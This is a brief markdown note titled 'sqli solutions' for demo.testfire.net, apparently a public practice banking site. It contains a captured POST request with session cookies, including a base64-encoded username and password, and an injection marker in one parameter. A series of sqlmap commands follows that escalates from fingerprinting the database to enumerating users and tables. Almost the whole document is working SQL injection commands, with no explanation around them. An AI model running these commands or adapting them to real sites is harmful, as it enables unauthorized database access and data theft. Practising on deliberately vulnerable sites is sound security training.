## sqli solutions 
### http://demo.testfire.net/bank/account.aspx

```
POST /bank/transaction.aspx HTTP/1.1
Host: demo.testfire.net
Content-Length: 104
Cache-Control: max-age=0
Origin: http://demo.testfire.net
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3488.0 Safari/537.36 autochrome/red
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://demo.testfire.net/bank/transaction.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: amSessionId=15463717023; ASP.NET_SessionId=sek2c5bdxjyg4h45r5io3h45; amUserInfo=UserName=anNtaXRo&Password=RGVtbzEyMzQ=; amUserId=100116014; amCreditOffer=CardType=Gold&Limit=10000&Interest=7.9
Connection: close

__VIEWSTATE=%2FwEPDwUKMTYzNDg3OTA4NmRk&after=&before=1*

```

./sqlmap.py -r session.txt --banner
./sqlmap.py -r session.txt --banner --technique=U
./sqlmap.py -r session.txt --banner --technique=U --level 3 --risk 3
./sqlmap.py -r session.txt --banner --level 3 --risk 3
./sqlmap.py -r session.txt --banner --level 3 --risk 3
./sqlmap.py -r session.txt --banner --level 3 --risk 3
./sqlmap.py -r session.txt --users --level 3 --risk 3 --technique=B --dbms Microsoft Access
./sqlmap.py -r session.txt --users --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
./sqlmap.py -r session.txt --tables --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access"
./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302
./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302 --techniqu=B
./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302 --techniqu=B -p uid
